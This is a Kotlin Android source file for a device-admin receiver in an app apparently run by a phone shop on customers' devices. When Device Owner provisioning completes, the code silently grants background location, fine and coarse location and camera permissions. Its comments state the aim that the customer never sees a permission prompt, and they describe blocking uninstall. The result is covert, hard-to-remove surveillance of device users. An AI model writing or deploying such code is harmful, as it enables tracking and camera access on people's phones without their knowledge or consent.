package com.smartphonecare.app

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent

/**
 * Required receiver for both "Device Admin" and "Device Owner" mode.
 * Device Owner (set via the QR/ADB enrolment flow already described in the
 * shop's admin UI) is what actually unlocks the strong controls: blocking
 * uninstall, blocking/hiding apps, and silent permission grants. Plain
 * Device Admin (if someone just taps "Activate" in Settings instead of
 * doing full provisioning) only gets force-lock and wipe.
 */
class SCDeviceAdminReceiver : DeviceAdminReceiver() {

    companion object {
        fun componentName(ctx: Context) = ComponentName(ctx, SCDeviceAdminReceiver::class.java)

        fun isDeviceOwner(ctx: Context): Boolean {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isDeviceOwnerApp(ctx.packageName)
        }
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
    }

    // Fired automatically by the system right after QR/ADB Device-Owner
    // provisioning finishes. We use it to silently pre-grant the runtime
    // permissions the bridge needs, so the customer is never shown a
    // permission popup later.
    override fun onProfileProvisioningComplete(context: Context, intent: Intent) {
        super.onProfileProvisioningComplete(context, intent)
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = componentName(context)
        try {
            dpm.setProfileEnabled(admin)
        } catch (e: Exception) { /* not a profile owner flow, ignore */ }
        try {
            for (perm in listOf(
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                android.Manifest.permission.CAMERA
            )) {
                dpm.setPermissionGrantState(
                    admin, context.packageName, perm,
                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                )
            }
        } catch (e: Exception) { /* best-effort */ }

        val launch = Intent(context, MainActivity::class.java)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(launch)
    }
}
